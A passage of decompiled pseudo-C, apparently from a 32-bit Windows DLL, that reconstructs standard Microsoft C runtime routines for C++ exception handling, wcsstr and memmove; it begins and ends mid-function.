    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _CatchGuardHandler(int a1, _DWORD *a2, int a3)",
    "{",
    "  return __InternalCxxFrameHandlerWrapper<__FrameHandler3>(a1, a2[4], a3, 0, a2[3], a2[5], a2, 0);",
    "}",
    "",
    "",
    "_DWORD *__cdecl _CreateFrameInfo(_DWORD *a1, int a2)",
    "{",
    "  *a1 = a2;",
    "  a1[1] = *(_DWORD *)(__vcrt_getptd() + 36);",
    "  *(_DWORD *)(__vcrt_getptd() + 36) = a1;",
    "  return a1;",
    "}",
    "",
    "",
    "int __cdecl _FindAndUnlinkFrame(int a1)",
    "{",
    "  int v1; // esi",
    "  int result; // eax",
    "  int *i; // ecx",
    "  int v4; // eax",
    "",
    "  if ( a1 == *(_DWORD *)(__vcrt_getptd() + 36) )",
    "  {",
    "    v1 = *(_DWORD *)(a1 + 4);",
    "    result = __vcrt_getptd();",
    "    *(_DWORD *)(result + 36) = v1;",
    "  }",
    "  else",
    "  {",
    "    for ( i = (int *)(*(_DWORD *)(__vcrt_getptd() + 36) + 4); ; i = (int *)(v4 + 4) )",
    "    {",
    "      v4 = *i;",
    "      if ( !*i )",
    "        abort();",
    "      if ( a1 == v4 )",
    "        break;",
    "    }",
    "    result = *(_DWORD *)(a1 + 4);",
    "    *i = result;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __usercall sub_10016A42@<eax>(",
    "        struct _EXCEPTION_REGISTRATION_RECORD **a1@<ebx>,",
    "        PEXCEPTION_RECORD ExceptionRecord,",
    "        _DWORD *TargetFrame,",
    "        int a4)",
    "{",
    "  int (*v5)(void); // [esp+4h] [ebp-4h] BYREF",
    "",
    "  if ( (ExceptionRecord->ExceptionFlags & 0x66) != 0 )",
    "  {",
    "    TargetFrame[9] = 1;",
    "    return 1;",
    "  }",
    "  else",
    "  {",
    "    __InternalCxxFrameHandlerWrapper<__FrameHandler3>(",
    "      ExceptionRecord,",
    "      TargetFrame[4],",
    "      a4,",
    "      0,",
    "      TargetFrame[3],",
    "      TargetFrame[5],",
    "      TargetFrame[6],",
    "      1);",
    "    if ( !TargetFrame[9] )",
    "      sub_10016951(a1, TargetFrame, ExceptionRecord);",
    "    _CallSETranslator((struct EHExceptionRecord *)0x123, (struct EHRegistrationNode *)&v5, 0, 0, 0, 0, 0);",
    "    return v5();",
    "  }",
    "}",
    "",
    "",
    "int __usercall __CxxFrameHandler3@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5)",
    "{",
    "  return __InternalCxxFrameHandlerWrapper<__FrameHandler3>(a2, a3, a4, a5, a1, 0, 0, 0);",
    "}",
    "",
    "",
    "void __cdecl __DestructExceptionObject(int a1)",
    "{",
    "  int v1; // ecx",
    "  void *v2; // edx",
    "  int v3; // ecx",
    "",
    "  if ( a1",
    "    && *(_DWORD *)a1 == -529697949",
    "    && *(_DWORD *)(a1 + 16) == 3",
    "    && (*(_DWORD *)(a1 + 20) == 429065504 || *(_DWORD *)(a1 + 20) == 429065505 || *(_DWORD *)(a1 + 20) == 429065506) )",
    "  {",
    "    v1 = *(_DWORD *)(a1 + 28);",
    "    if ( v1 )",
    "    {",
    "      v2 = *(void **)(v1 + 4);",
    "      if ( v2 )",
    "      {",
    "        _CallMemberFunction0(*(void *const *)(a1 + 24), v2);",
    "      }",
    "      else if ( (*(_BYTE *)v1 & 0x10) != 0 )",
    "      {",
    "        v3 = **(_DWORD **)(a1 + 24);",
    "        if ( v3 )",
    "          (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)v3 + 8))(*(_DWORD *)(*(_DWORD *)v3 + 8), v3);",
    "      }",
    "    }",
    "  }",
    "}",
    "",
    "",
    "void __stdcall _CallMemberFunction0(void *const a1, void (__thiscall *a2)(void *const))",
    "{",
    "  a2(a1);",
    "}",
    "",
    "",
    "unsigned int __cdecl _FilterSetCurrentException(struct _EXCEPTION_POINTERS *a1, char a2)",
    "{",
    "  PEXCEPTION_RECORD ExceptionRecord; // esi",
    "  PCONTEXT ContextRecord; // esi",
    "",
    "  if ( a2 )",
    "  {",
    "    ExceptionRecord = a1->ExceptionRecord;",
    "    if ( a1->ExceptionRecord->ExceptionCode == -529697949",
    "      && ExceptionRecord->NumberParameters == 3",
    "      && (ExceptionRecord->ExceptionInformation[0] == 429065504",
    "       || ExceptionRecord->ExceptionInformation[0] == 429065505",
    "       || ExceptionRecord->ExceptionInformation[0] == 429065506) )",
    "    {",
    "      *(_DWORD *)(__vcrt_getptd() + 16) = ExceptionRecord;",
    "      ContextRecord = a1->ContextRecord;",
    "      *(_DWORD *)(__vcrt_getptd() + 20) = ContextRecord;",
    "      terminate();",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl _IsExceptionObjectToBeDestroyed(int a1)",
    "{",
    "  _DWORD *v1; // eax",
    "",
    "  v1 = *(_DWORD **)(__vcrt_getptd() + 36);",
    "  if ( !v1 )",
    "    return 1;",
    "  while ( *v1 != a1 )",
    "  {",
    "    v1 = (_DWORD *)v1[1];",
    "    if ( !v1 )",
    "      return 1;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl __AdjustPointer(int a1, _DWORD *a2)",
    "{",
    "  int v2; // esi",
    "  int result; // eax",
    "",
    "  v2 = a2[1];",
    "  result = a1 + *a2;",
    "  if ( v2 >= 0 )",
    "    result += v2 + *(_DWORD *)(*(_DWORD *)(v2 + a1) + a2[2]);",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl __FrameUnwindFilter(int a1)",
    "{",
    "  _DWORD *v1; // edi",
    "  int v2; // eax",
    "  int v4; // esi",
    "",
    "  v1 = *(_DWORD **)a1;",
    "  if ( **(_DWORD **)a1 == -532462766 || *v1 == -532459699 )",
    "  {",
    "    if ( *(int *)(__vcrt_getptd() + 24) > 0 )",
    "    {",
    "      v2 = __vcrt_getptd();",
    "      --*(_DWORD *)(v2 + 24);",
    "    }",
    "  }",
    "  else if ( *v1 == -529697949 )",
    "  {",
    "    *(_DWORD *)(__vcrt_getptd() + 16) = v1;",
    "    v4 = *(_DWORD *)(a1 + 4);",
    "    *(_DWORD *)(__vcrt_getptd() + 20) = v4;",
    "    terminate();",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "void __cdecl __std_exception_copy(int a1, int a2)",
    "{",
    "  unsigned int v2; // kr00_4",
    "  char *v3; // eax",
    "  char *v4; // esi",
    "  char *v5; // ecx",
    "",
    "  if ( *(_BYTE *)(a1 + 4) && *(_DWORD *)a1 )",
    "  {",
    "    v2 = strlen(*(const char **)a1);",
    "    v3 = (char *)sub_1001CC90(v2 + 1);",
    "    v4 = v3;",
    "    if ( v3 )",
    "    {",
    "      strcpy_s(v3, v2 + 1, *(const char **)a1);",
    "      v5 = v4;",
    "      v4 = 0;",
    "      *(_DWORD *)a2 = v5;",
    "      *(_BYTE *)(a2 + 4) = 1;",
    "    }",
    "    j___free_base(v4);",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)a2 = *(_DWORD *)a1;",
    "    *(_BYTE *)(a2 + 4) = 0;",
    "  }",
    "}",
    "",
    "",
    "void __cdecl __std_exception_destroy(int a1)",
    "{",
    "  if ( *(_BYTE *)(a1 + 4) )",
    "    j___free_base(*(void **)a1);",
    "  *(_DWORD *)a1 = 0;",
    "  *(_BYTE *)(a1 + 4) = 0;",
    "}",
    "",
    "",
    "int __cdecl ValidateLocalCookies(int a1)",
    "{",
    "  return *(_DWORD *)(a1 + 8);",
    "}",
    "",
    "",
    "int __cdecl _except_handler4(PEXCEPTION_RECORD ExceptionRecord, char *TargetFrame, int a3)",
    "{",
    "  char *v3; // esi",
    "  int v4; // edi",
    "  int v5; // eax",
    "  int v6; // ebx",
    "  uintptr_t v7; // eax",
    "  int v8; // ecx",
    "  int v9; // eax",
    "  char v10; // cl",
    "  EXCEPTION_RECORD *v12; // eax",
    "  char *v13; // eax",
    "  uintptr_t v14; // [esp-Ch] [ebp-34h]",
    "  int v15; // [esp-8h] [ebp-30h]",
    "  DWORD ExceptionCode; // [esp-4h] [ebp-2Ch]",
    "  _DWORD v17[2]; // [esp+Ch] [ebp-1Ch] BYREF",
    "  uintptr_t v18; // [esp+14h] [ebp-14h]",
    "  char *v19; // [esp+18h] [ebp-10h]",
    "  int v20; // [esp+1Ch] [ebp-Ch]",
    "  uintptr_t v21; // [esp+20h] [ebp-8h]",
    "  char v22; // [esp+27h] [ebp-1h]",
    "",
    "  v22 = 0;",
    "  ExceptionCode = ExceptionRecord->ExceptionCode;",
    "  v20 = 1;",
    "  ExceptionRecord->ExceptionCode = _filter_x86_sse2_floating_point_exception_default(ExceptionCode);",
    "  v3 = TargetFrame + 16;",
    "  v14 = __security_cookie ^ *((_DWORD *)TargetFrame + 2);",
    "  v19 = TargetFrame + 16;",
    "  v21 = v14;",
    "  ValidateLocalCookies(v14);",
    "  __except_validate_context_record(a3);",
    "  v4 = *((_DWORD *)TargetFrame + 3);",
    "  if ( (ExceptionRecord->ExceptionFlags & 0x66) != 0 )",
    "  {",
    "    if ( v4 != -2 )",
    "    {",
    "      _EH4_LocalUnwind(v3, &__security_cookie);",
    "LABEL_14:",
    "      ValidateLocalCookies(v21);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v17[0] = ExceptionRecord;",
    "    v17[1] = a3;",
    "    *((_DWORD *)TargetFrame - 1) = v17;",
    "    if ( v4 != -2 )",
    "    {",
    "      do",
    "      {",
    "        v5 = v4 + 2 * (v4 + 2);",
    "        v6 = *(_DWORD *)(v21 + 4 * v5);",
    "        v7 = v21 + 4 * v5;",
    "        v8 = *(_DWORD *)(v7 + 4);",
    "        v18 = v7;",
    "        if ( v8 )",
    "        {",
    "          v9 = _EH4_CallFilterFunc(v8, v3);",
    "          v10 = 1;",
    "          v22 = 1;",
    "          if ( v9 < 0 )",
    "          {",
    "            v20 = 0;",
    "            goto LABEL_14;",
    "          }",
    "          if ( v9 > 0 )",
    "          {",
    "            v12 = ExceptionRecord;",
    "            if ( ExceptionRecord->ExceptionCode == -529697949 && __DestructExceptionObject )",
    "            {",
    "              if ( _IsNonwritableInCurrentImage(&off_10031018) )",
    "              {",
    "                __DestructExceptionObject((int)ExceptionRecord);",
    "                v3 = v19;",
    "              }",
    "              v12 = ExceptionRecord;",
    "            }",
    "            _EH4_GlobalUnwind2(TargetFrame, v12);",
    "            v13 = TargetFrame;",
    "            if ( *((_DWORD *)TargetFrame + 3) != v4 )",
    "            {",
    "              _EH4_LocalUnwind(v3, &__security_cookie);",
    "              v13 = TargetFrame;",
    "            }",
    "            v15 = v21;",
    "            *((_DWORD *)v13 + 3) = v6;",
    "            ValidateLocalCookies(v15);",
    "            _EH4_TransferToHandler(*(_DWORD *)(v18 + 8), v3);",
    "            __debugbreak();",
    "          }",
    "        }",
    "        else",
    "        {",
    "          v10 = v22;",
    "        }",
    "        v4 = v6;",
    "      }",
    "      while ( v6 != -2 );",
    "      if ( !v10 )",
    "        return v20;",
    "      goto LABEL_14;",
    "    }",
    "  }",
    "  return v20;",
    "}",
    "",
    "",
    "wchar_t *__cdecl wcsstr(const wchar_t *Str, const wchar_t *SubStr)",
    "{",
    "  __m128i *v2; // edi",
    "  wchar_t v3; // cx",
    "  wchar_t v4; // dx",
    "  __m128i inserted; // xmm0",
    "  wchar_t v7; // dx",
    "  int v8; // ecx",
    "  __m128i *v9; // edx",
    "  unsigned __int8 v10; // cf",
    "  __m128i *v11; // ecx",
    "  __m128i *i; // edi",
    "  unsigned __int8 v13; // sf",
    "  unsigned int v14; // eax",
    "  __m128i *v15; // ecx",
    "  __m128i v16; // xmm4",
    "  unsigned int v17; // eax",
    "  __m128i *j; // edx",
    "  unsigned int v19; // eax",
    "  unsigned int v20; // eax",
    "  int v21; // eax",
    "  int v22; // ecx",
    "  int v23; // [esp+4h] [ebp-8h]",
    "",
    "  v2 = (__m128i *)SubStr;",
    "  v3 = *SubStr;",
    "  v4 = *SubStr;",
    "  if ( !*SubStr )",
    "    return (wchar_t *)Str;",
    "  if ( dword_1004014C > 1 )",
    "  {",
    "    if ( ((unsigned __int16)SubStr & 0xFFFu) > 0xFF0 )",
    "    {",
    "      inserted = (__m128i)xmmword_10031020;",
    "      v7 = *SubStr;",
    "      v8 = 8;",
    "      do",
    "      {",
    "        inserted = _mm_insert_epi16(_mm_srli_si128(inserted, 2), v7, 7);",
    "        if ( v7 )",
    "        {",
    "          v2 = (__m128i *)((char *)v2 + 2);",
    "          v7 = v2->m128i_i16[0];",
    "        }",
    "        --v8;",
    "      }",
    "      while ( v8 );",
    "      v3 = *SubStr;",
    "    }",
    "    else",
    "    {",
    "      inserted = *(__m128i *)SubStr;",
    "    }",
    "    v9 = (__m128i *)Str;",
    "    while ( 1 )",
    "    {",
    "      if ( ((unsigned __int16)v9 & 0xFFFu) > 0xFF0 )",
    "      {",
    "        if ( !v9->m128i_i16[0] )",
    "          return 0;",
    "        if ( v9->m128i_i16[0] == v3 )",
    "          goto LABEL_18;",
    "        v9 = (__m128i *)((char *)v9 + 2);",
    "      }",
    "      else",
    "      {",
    "        v10 = _mm_cmpistrc(inserted, *v9, 13);",
    "        if ( !(v10 | _mm_cmpistrz(inserted, *v9, 13)) )",
    "        {",
    "          ++v9;",
    "          goto LABEL_15;",
    "        }",
    "        if ( !v10 )",
    "          return 0;",
    "        v9 = (__m128i *)((char *)v9 + 2 * _mm_cmpistri(inserted, *v9, 13));",
    "LABEL_18:",
    "        v11 = (__m128i *)SubStr;",
    "        for ( i = v9; ; i = (__m128i *)((char *)i + 2) )",
    "        {",
    "          while ( ((unsigned __int16)i & 0xFFFu) <= 0xFF0 && ((unsigned __int16)v11 & 0xFFFu) <= 0xFF0 )",
    "          {",
    "            v13 = _mm_cmpistrs(*v11, *i, 13);",
    "            if ( !_mm_cmpistro(*v11, *i, 13) )",
    "              goto LABEL_30;",
    "            if ( v13 )",
    "              return (wchar_t *)v9;",
    "            ++i;",
    "            ++v11;",
    "          }",
    "          if ( !v11->m128i_i16[0] )",
    "            return (wchar_t *)v9;",
    "          if ( i->m128i_i16[0] != v11->m128i_i16[0] )",
    "            break;",
    "          v11 = (__m128i *)((char *)v11 + 2);",
    "        }",
    "LABEL_30:",
    "        v9 = (__m128i *)((char *)v9 + 2);",
    "LABEL_15:",
    "        v3 = *SubStr;",
    "      }",
    "    }",
    "  }",
    "  if ( dword_1004014C == 1 )",
    "  {",
    "    v14 = v3;",
    "    v15 = (__m128i *)Str;",
    "    v16 = _mm_shuffle_epi32(_mm_shufflelo_epi16(_mm_cvtsi32_si128(v14), 0), 0);",
    "    while ( 1 )",
    "    {",
    "      if ( ((unsigned __int16)v15 & 0xFFFu) > 0xFF0 )",
    "        goto LABEL_37;",
    "      v17 = _mm_movemask_epi8((__m128i)_mm_or_ps(",
    "                                         (__m128)_mm_cmpeq_epi16((__m128i)xmmword_10031020, *v15),",
    "                                         (__m128)_mm_cmpeq_epi16(*v15, v16)));",
    "      if ( v17 )",
    "      {",
    "        _BitScanForward(&v17, v17);",
    "        v15 = (__m128i *)((char *)v15 + 2 * (v17 >> 1));",
    "LABEL_37:",
    "        if ( !v15->m128i_i16[0] )",
    "          return 0;",
    "        if ( v4 == v15->m128i_i16[0] )",
    "        {",
    "          for ( j = v15; ; j = (__m128i *)((char *)j + 2) )",
    "          {",
    "            while ( 2 )",
    "            {",
    "              if ( ((unsigned __int16)v2 & 0xFFFu) <= 0xFF0 && ((unsigned __int16)j & 0xFFFu) <= 0xFF0 )",
    "              {",
    "                v19 = _mm_movemask_epi8((__m128i)_mm_or_ps(",
    "                                                   (__m128)_mm_cmpeq_epi16(",
    "                                                             _mm_cmpeq_epi16(*j, *v2),",
    "                                                             (__m128i)xmmword_10031020),",
    "                                                   (__m128)_mm_cmpeq_epi16((__m128i)xmmword_10031020, *v2)));",
    "                if ( !v19 )",
    "                {",
    "                  ++j;",
    "                  ++v2;",
    "                  continue;",
    "                }",
    "                _BitScanForward(&v19, v19);",
    "                v20 = v19 & 0xFFFFFFFE;",
    "                j = (__m128i *)((char *)j + v20);",
    "                v2 = (__m128i *)((char *)v2 + v20);",
    "              }",
    "              break;",
    "            }",
    "            if ( !v2->m128i_i16[0] )",
    "              return (wchar_t *)v15;",
    "            if ( j->m128i_i16[0] != v2->m128i_i16[0] )",
    "            {",
    "              v2 = (__m128i *)SubStr;",
    "              v4 = *SubStr;",
    "              break;",
    "            }",
    "            v2 = (__m128i *)((char *)v2 + 2);",
    "          }",
    "        }",
    "        v15 = (__m128i *)((char *)v15 + 2);",
    "      }",
    "      else",
    "      {",
    "        ++v15;",
    "      }",
    "    }",
    "  }",
    "  v9 = (__m128i *)Str;",
    "  if ( !*Str )",
    "    return 0;",
    "  v21 = (char *)Str - (char *)SubStr;",
    "  v23 = (char *)Str - (char *)SubStr;",
    "  while ( v2->m128i_i16[0] )",
    "  {",
    "    v22 = *(unsigned __int16 *)((char *)v2->m128i_u16 + v21) - v2->m128i_u16[0];",
    "    v21 = v23;",
    "    if ( !v22 )",
    "    {",
    "      v2 = (__m128i *)((char *)v2 + 2);",
    "      if ( *(__int16 *)((char *)v2->m128i_i16 + v23) )",
    "        continue;",
    "    }",
    "    if ( !v2->m128i_i16[0] )",
    "      return (wchar_t *)v9;",
    "    v2 = (__m128i *)SubStr;",
    "    v9 = (__m128i *)((char *)v9 + 2);",
    "    v21 = v23 + 2;",
    "    v23 += 2;",
    "    if ( !v9->m128i_i16[0] )",
    "      return 0;",
    "  }",
    "  return (wchar_t *)v9;",
    "}",
    "",
    "",
    "void __stdcall  _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo)",
    "{",
    "  _ThrowInfo *v2; // edi",
    "  ULONG_PTR v3; // ebx",
    "  int v4; // [esp-8h] [ebp-24h]",
    "  ULONG_PTR Arguments[3]; // [esp+10h] [ebp-Ch] BYREF",
    "",
    "  v2 = pThrowInfo;",
    "  v3 = 429065504;",
    "  if ( pThrowInfo )",
    "  {",
    "    if ( (pThrowInfo->attributes & 0x10) == 0",
    "      || (v4 = *(_DWORD *)pExceptionObject - 4,",
    "          v2 = *(_ThrowInfo **)(*(_DWORD *)v4 + 24),",
    "          (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)v4 + 32))(*(_DWORD *)(*(_DWORD *)v4 + 32), v4),",
    "          v2) )",
    "    {",
    "      if ( (v2->attributes & 8) != 0 )",
    "        v3 = 26820608;",
    "    }",
    "  }",
    "  Arguments[1] = (ULONG_PTR)pExceptionObject;",
    "  Arguments[0] = v3;",
    "  Arguments[2] = (ULONG_PTR)v2;",
    "  RaiseException(0xE06D7363, 1u, 3u, Arguments);",
    "}",
    "",
    "",
    "void *__cdecl memmove(void *a1, const void *Src, size_t Size)",
    "{",
    "  const __m128i *v3; // esi",
    "  size_t v4; // ecx",
    "  __m128i *v5; // edi",
    "  void *result; // eax",
    "  __int64 v7; // xmm1_8",
    "  __m128i v8; // xmm1",
    "  const __m128i *v9; // esi",
    "  __m128i v10; // xmm3",
    "  __m128i v11; // xmm0",
    "  __m128i v12; // xmm5",
    "  const __m128i *v13; // esi",
    "  __m128i v14; // xmm1",
    "  const __m128i *v15; // esi",
    "  __m128i v16; // xmm3",
    "  __m128i v17; // xmm0",
    "  __m128i v18; // xmm5",
    "  __m128i v19; // xmm1",
    "  const __m128i *v20; // esi",
    "  __m128i v21; // xmm3",
    "  __m128i v22; // xmm0",
    "  __m128i v23; // xmm5",
    "  __m128i v24; // xmm1",
    "  __int32 v25; // eax",
    "  __int64 v26; // xmm1_8",
    "  char v27; // dl",
    "  size_t v28; // ecx",
    "  const __m128i *v29; // esi",
    "  __m128i *v30; // edi",
    "  int v31; // edx",
    "  char v32; // dl",
    "  size_t v33; // ecx",
    "  int v34; // edx",
    "  __int8 *v35; // esi",
    "  char *v36; // edi",
    "  __m128i v37; // xmm1",
    "  __m128i v38; // xmm2",
    "  __m128i v39; // xmm3",
    "  __m128i v40; // xmm4",
    "  __m128i v41; // xmm5",
    "  __m128i v42; // xmm6",
    "  __m128i v43; // xmm7",
    "  __m128i v44; // xmm1",
    "  int v45; // eax",
    "  size_t v46; // edx",
    "  size_t j; // edx",
    "  __m128i si128; // xmm1",
    "  __m128i v49; // xmm2",
    "  __m128i v50; // xmm3",
    "  __m128i v51; // xmm5",
    "  __m128i v52; // xmm6",
    "  __m128i v53; // xmm7",
    "  size_t k; // edx",
    "  __m128i v55; // xmm1",
    "  unsigned int v56; // ecx",
    "  char v57; // al",
    "  unsigned int m; // ecx",
    "  int v59; // ecx",
    "  unsigned int v60; // eax",
    "  int v61; // ecx",
    "  unsigned int i; // eax",
    "  size_t v63; // [esp-4h] [ebp-Ch]",
    "",
    "  v3 = (const __m128i *)Src;",
    "  v4 = Size;",
    "  v5 = (__m128i *)a1;",
    "  if ( a1 > Src && a1 < (char *)Src + Size )",
    "  {",
    "    v29 = (const __m128i *)((char *)Src + Size);",
    "    v30 = (__m128i *)((char *)a1 + Size);",
    "    if ( Size >= 0x20 )",
    "    {",
    "      if ( _bittest(dword_1003F090, 1u) )",
    "      {",
    "        for ( ; ((unsigned __int8)v30 & 0xF) != 0; v30->m128i_i8[0] = v29->m128i_i8[0] )",
    "        {",
    "          --v4;",
    "          v29 = (const __m128i *)((char *)v29 - 1);",
    "          v30 = (__m128i *)((char *)v30 - 1);",
    "        }",
    "        do",
    "        {",
    "          if ( v4 < 0x80 )",
    "            break;",
    "          v29 -= 8;",
    "          v30 -= 8;",
    "          v37 = _mm_loadu_si128(v29 + 1);",
    "          v38 = _mm_loadu_si128(v29 + 2);",
    "          v39 = _mm_loadu_si128(v29 + 3);",
    "          v40 = _mm_loadu_si128(v29 + 4);",
    "          v41 = _mm_loadu_si128(v29 + 5);",
    "          v42 = _mm_loadu_si128(v29 + 6);",
    "          v43 = _mm_loadu_si128(v29 + 7);",
    "          *v30 = _mm_loadu_si128(v29);",
    "          v30[1] = v37;",
    "          v30[2] = v38;",
    "          v30[3] = v39;",
    "          v30[4] = v40;",
    "          v30[5] = v41;",
    "          v30[6] = v42;",
    "          v30[7] = v43;",
    "          v4 -= 128;",
    "        }",
    "        while ( (v4 & 0xFFFFFF80) != 0 );",
    "        if ( v4 >= 0x20 )",
    "        {",
    "          do",
    "          {",
    "            v29 -= 2;",
    "            v30 -= 2;",
    "            v44 = _mm_loadu_si128(v29 + 1);",
    "            *v30 = _mm_loadu_si128(v29);",
    "            v30[1] = v44;",
    "            v4 -= 32;",
    "          }",
    "          while ( (v4 & 0xFFFFFFE0) != 0 );",
    "        }",
    "      }",
    "      else",
    "      {",
    "        if ( ((unsigned __int8)v30 & 3) != 0 )",
    "        {",
    "          v31 = (unsigned __int8)v30 & 3;",
    "          v4 = Size - v31;",
    "          do",
    "          {",
    "            v30[-1].m128i_i8[15] = v29[-1].m128i_i8[15];",
    "            v29 = (const __m128i *)((char *)v29 - 1);",
    "            v30 = (__m128i *)((char *)v30 - 1);",
    "            --v31;",
    "          }",
    "          while ( v31 );",
    "        }",
    "        if ( v4 >= 0x20 )",
    "        {",
    "          v32 = v4;",
    "          v33 = v4 >> 2;",
    "          v34 = v32 & 3;",
    "          v35 = &v29[-1].m128i_i8[12];",
    "          v36 = &v30[-1].m128i_i8[12];",
    "          while ( v33 )",
    "          {",
    "            *(_DWORD *)v36 = *(_DWORD *)v35;",
    "            v35 -= 4;",
    "            v36 -= 4;",
    "            --v33;",
    "          }",
    "          switch ( v34 )",
    "          {",
    "            case 0:",
    "              result = a1;",
    "              break;",
    "            case 1:",
    "              v36[3] = v35[3];",
    "              result = a1;",
    "              break;",
    "            case 2:",
    "              v36[3] = v35[3];",
    "              v36[2] = v35[2];",
    "              result = a1;",
    "              break;",
    "            case 3:",
    "              v36[3] = v35[3];",
    "              v36[2] = v35[2];",
    "              v36[1] = v35[1];",
    "              result = a1;",
    "              break;",
    "          }",
    "          return result;",
    "        }",
    "      }",
    "    }",
    "    for ( ; (v4 & 0xFFFFFFFC) != 0; v4 -= 4 )",
    "    {",
    "      v30 = (__m128i *)((char *)v30 - 4);",
    "      v29 = (const __m128i *)((char *)v29 - 4);",
    "      v30->m128i_i32[0] = v29->m128i_i32[0];",
    "    }",
    "    for ( ; v4; --v4 )",
    "    {",
    "      v30 = (__m128i *)((char *)v30 - 1);",
    "      v29 = (const __m128i *)((char *)v29 - 1);",
    "      v30->m128i_i8[0] = v29->m128i_i8[0];",
    "    }",
    "    return a1;",
    "  }",
    "  else",
    "  {",
    "    if ( Size < 0x20 )",
    "      goto CopyUpDwordMov;",
    "    if ( Size < 0x80 )",
    "    {",
    "      if ( !_bittest(dword_1003F090, 1u) )",
    "        goto Dword_align;",
    "      goto XmmCopySmallTest;",
    "    }",
    "    if ( _bittest(&dword_10040150, 1u) )",
    "    {",
    "      qmemcpy(a1, Src, Size);",
    "      return a1;",
    "    }",
    "    if ( (((unsigned int)Src ^ (unsigned int)a1) & 0xF) == 0 && _bittest(dword_1003F090, 1u) )",
    "    {",
    "      v45 = (unsigned __int8)Src & 0xF;",
    "      if ( ((unsigned __int8)Src & 0xF) != 0 )",
    "      {",
    "        v63 = Size - (16 - v45);",
    "        v60 = 16 - v45;",
    "        v61 = v60 & 3;",
    "        if ( (v60 & 3) != 0 )",
    "        {",
    "          do",
    "          {",
    "            v5->m128i_i8[0] = v3->m128i_i8[0];",
    "            v3 = (const __m128i *)((char *)v3 + 1);",
    "            v5 = (__m128i *)((char *)v5 + 1);",
    "            --v61;",
    "          }",
    "          while ( v61 );",
    "        }",
    "        for ( i = v60 >> 2; i; --i )",
    "        {",
    "          v5->m128i_i32[0] = v3->m128i_i32[0];",
    "          v3 = (const __m128i *)((char *)v3 + 4);",
    "          v5 = (__m128i *)((char *)v5 + 4);",
    "        }",
    "        v4 = v63;",
    "      }",
    "      v46 = v4;",
    "      v4 &= 0x7Fu;",
    "      for ( j = v46 >> 7; j; --j )",
    "      {",
    "        si128 = _mm_load_si128(v3 + 1);",
    "        v49 = _mm_load_si128(v3 + 2);",
    "        v50 = _mm_load_si128(v3 + 3);",
    "        *v5 = _mm_load_si128(v3);",
    "        v5[1] = si128;",
    "        v5[2] = v49;",
    "        v5[3] = v50;",
    "        v51 = _mm_load_si128(v3 + 5);",
    "        v52 = _mm_load_si128(v3 + 6);",
    "        v53 = _mm_load_si128(v3 + 7);",
    "        v5[4] = _mm_load_si128(v3 + 4);",
    "        v5[5] = v51;",
    "        v5[6] = v52;",
    "        v5[7] = v53;",
    "        v3 += 8;",
    "        v5 += 8;",
    "      }",
    "XmmCopySmallTest:",
    "      if ( !v4 )",
    "        return a1;",
    "      for ( k = v4 >> 5; k; --k )",
    "      {",
    "        v55 = _mm_loadu_si128(v3 + 1);",
    "        *v5 = _mm_loadu_si128(v3);",
    "        v5[1] = v55;",
    "        v3 += 2;",
    "        v5 += 2;",
    "      }",
    "CopyUpDwordMov:",
    "      v56 = v4 & 0x1F;",
    "      if ( v56 )",
    "      {",
    "        v57 = v56;",
    "        for ( m = v56 >> 2; m; --m )",
    "        {",
    "          v5->m128i_i32[0] = v3->m128i_i32[0];",
    "          v5 = (__m128i *)((char *)v5 + 4);",
    "          v3 = (const __m128i *)((char *)v3 + 4);",
    "        }",
    "        v59 = v57 & 3;",
    "        if ( (v57 & 3) != 0 )",
    "        {",
    "          do",
    "          {",
    "            v5->m128i_i8[0] = v3->m128i_i8[0];",
    "            v3 = (const __m128i *)((char *)v3 + 1);",
    "            v5 = (__m128i *)((char *)v5 + 1);",
    "            --v59;",
    "          }",
    "          while ( v59 );",
    "        }",
    "      }",
    "      return a1;",
    "    }",
    "    if ( !_bittest(&dword_10040150, 0) || ((unsigned __int8)a1 & 3) != 0 )",
    "    {",
    "Dword_align:",
    "      if ( ((unsigned __int8)a1 & 3) != 0 )",
    "      {",
    "        do",
    "        {",
    "          v5->m128i_i8[0] = v3->m128i_i8[0];",
    "          --v4;",
    "          v3 = (const __m128i *)((char *)v3 + 1);",
    "          v5 = (__m128i *)((char *)v5 + 1);",
    "        }",
    "        while ( ((unsigned __int8)v5 & 3) != 0 );",
    "      }",
    "      goto Dword_align_Ok;",
    "    }",
    "    if ( ((unsigned __int8)Src & 3) != 0 )",
    "    {",
    "Dword_align_Ok:",
    "      v27 = v4;",
    "      if ( v4 >= 0x20 )",
    "      {",
    "        v28 = v4 >> 2;",
    "        qmemcpy(v5, v3, 4 * v28);",
    "        v13 = (const __m128i *)((char *)v3 + 4 * v28);",
    "        v5 = (__m128i *)((char *)v5 + 4 * v28);",
    "        switch ( v27 & 3 )",
    "        {",
    "          case 0:",
    "            goto TrailingUp0;",
    "          case 1:",
    "            goto TrailingUp1;",
    "          case 2:",
    "            goto TrailingUp2;",
    "          case 3:",
    "            goto TrailingUp3;",
    "        }",
    "      }",
    "      goto CopyUpDwordMov;",
    "    }",
    "    if ( ((unsigned __int8)a1 & 4) != 0 )",
    "    {",
    "      v4 = Size - 4;",
    "      v3 = (const __m128i *)((char *)Src + 4);",
    "      *(_DWORD *)a1 = *(_DWORD *)Src;",
    "      v5 = (__m128i *)((char *)a1 + 4);",
    "    }",
    "    if ( ((unsigned __int8)v5 & 8) != 0 )",
    "    {",
    "      v7 = v3->m128i_i64[0];",
    "      v4 -= 8;",
    "      v3 = (const __m128i *)((char *)v3 + 8);",
    "      v5->m128i_i64[0] = v7;",
    "      v5 = (__m128i *)((char *)v5 + 8);",
    "    }",
    "    if ( ((unsigned __int8)v3 & 7) != 0 )",
    "    {",
    "      if ( ((unsigned __int8)v3 & 8) != 0 )",
    "      {",
    "        v8 = _mm_load_si128((const __m128i *)((char *)v3 - 12));",
    "        v9 = (const __m128i *)((char *)v3 - 12);",
    "        do",
    "        {",
